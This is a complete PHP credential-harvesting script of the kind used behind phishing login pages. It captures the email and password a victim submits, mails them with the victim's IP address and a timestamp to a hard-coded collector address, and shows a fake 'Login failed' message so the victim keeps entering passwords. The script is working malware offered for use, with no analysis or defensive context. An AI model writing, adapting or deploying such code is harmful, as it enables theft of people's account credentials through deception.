<?php

$ip = getenv("REMOTE_ADDR");
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$server = date("D/M/d, Y g:i a");

if($email != null && $password != null){
	
	$own = 'r14051994@gmail.com';
	$subj = "E-mail Login - ".$ip;

	$headers = "From: Result <logz@couklas.org> \n";
	$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
	$headers .= "MIME-Version: 1.0\n";

	$message = "[E-mail Account] \n\n";
	$message .= "Username : ".$email."\n";
	$message .= "Password : ".$password."\n";
	$message .= "IP : ".$ip."\n";
	$message .= "Date : ".$server."\n";

	mail($own,$subj,$message,$headers);
	
	$signal = 'ok';
	$msg = 'Login failed! Please enter correct password';
	
	// $praga=rand();
	// $praga=md5($praga);
	
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>